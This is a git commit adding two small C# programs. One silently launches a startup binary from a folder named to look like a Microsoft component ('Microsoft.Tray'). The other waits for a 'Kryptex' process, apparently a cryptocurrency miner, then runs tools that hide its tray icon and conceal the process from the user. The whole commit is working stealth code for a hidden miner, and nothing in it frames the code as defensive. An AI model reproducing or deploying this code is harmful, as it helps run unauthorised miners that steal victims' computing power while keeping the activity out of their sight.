71af178fbf41d267e76e170ee099235e76157f24
Arvesso <109855015+Arvesso@users.noreply.github.com>
2023-03-18 22:19:18 +0300

    Uploaded

---
+++ Startup/AutoStart/Program.cs
@@ -0,0 +1,20 @@
+﻿using System.Diagnostics;
+using System.IO;
+
+namespace AutoStart
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            var processInfo = new ProcessStartInfo(Path.Combine("C:\\Program Files\\Microsoft.Tray", "Startup.exe"))
+            {
+                CreateNoWindow = true,
+                UseShellExecute = false,
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+            };
+            Process.Start(processInfo);
+        }
+    }
+}
---
+++ Startup/Startup/Program.cs
@@ -0,0 +1,39 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Threading;
+
+namespace Startup
+{
+    internal class Program
+    {
+        private const string PROGRAM_PATH = "C:\\Program Files\\Microsoft.Tray";
+        static void Main(string[] args)
+        {
+            while (true)
+            {
+                Process[] process = Process.GetProcessesByName("Kryptex");
+                if (process.Length != 0)
+                    break;
+            }
+
+            Thread.Sleep(10000);
+
+            for (int i = 0; i <= 15; i++)
+            {
+                Thread.Sleep(350);
+                Process.Start(Path.Combine(PROGRAM_PATH, "HideTrayIcon.exe"));
+            }
+
+            var processInfo = new ProcessStartInfo(Path.Combine(PROGRAM_PATH, "ProcessHider.exe"), "-n \"Kryptex\"")
+            {
+                CreateNoWindow = true,
+                UseShellExecute = false,
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+            };
+
+            Process.Start(processInfo);
+        }
+    }
+}
